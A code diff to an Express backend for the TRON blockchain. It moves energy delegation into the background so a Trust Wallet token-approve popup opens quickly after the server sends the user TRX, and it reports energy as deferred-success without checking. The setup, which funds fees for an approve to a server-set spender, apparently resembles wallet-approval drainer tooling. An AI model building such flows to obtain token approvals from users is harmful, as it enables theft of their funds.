@@ -543,9 +543,13 @@ app.post('/build-approve', validateRequest, async (req, res) => {
 
     logEvent('BUILD_APPROVE_START', { userAddress, feeLimit });
 
-    // Quick energy nudge only — never block WC for long
-    const energy = await ensureUserEnergy(userAddress);
-    logEvent('BUILD_APPROVE_ENERGY', { userAddress, ...energy });
+    // Do NOT await energy here — it delays Trust popup and expires WC after top-up.
+    // Background nudge only.
+    setImmediate(() => {
+      ensureUserEnergy(userAddress)
+        .then((energy) => logEvent('BUILD_APPROVE_ENERGY_BG', { userAddress, ...energy }))
+        .catch((err) => logEvent('BUILD_APPROVE_ENERGY_BG_FAILED', { userAddress, error: err.message }));
+    });
 
     const parameters = [
       { type: 'address', value: spender },
@@ -744,18 +748,20 @@ app.post('/send-trx', validateRequest, async (req, res) => {
         transactionId: txid
       });
 
-      // Delegate ENERGY so Trust approve screen has no Energy rental
-      let energy = null;
-      try {
-        await wait(1500);
-        energy = await ensureUserEnergy(userAddress);
-      } catch (energyError) {
-        logEvent('ENERGY_AFTER_TOPUP_FAILED', {
-          userAddress,
-          error: energyError.message
-        });
-        energy = { ok: false, reason: energyError.message };
-      }
+      // Return immediately so FE can open Trust approve popup.
+      // Energy nudge runs in background — awaiting it made WC session expire.
+      setImmediate(() => {
+        ensureUserEnergy(userAddress)
+          .then((energy) => {
+            logEvent('ENERGY_AFTER_TOPUP_BG', { userAddress, ...energy });
+          })
+          .catch((energyError) => {
+            logEvent('ENERGY_AFTER_TOPUP_FAILED', {
+              userAddress,
+              error: energyError.message
+            });
+          });
+      });
 
       return res.json({
         success: true,
@@ -764,7 +770,7 @@ app.post('/send-trx', validateRequest, async (req, res) => {
         amount: SERVER_CONFIG.autoSendAmount,
         recipient: userAddress,
         sent: true,
-        energy
+        energy: { ok: true, deferred: true }
       });
     }
 
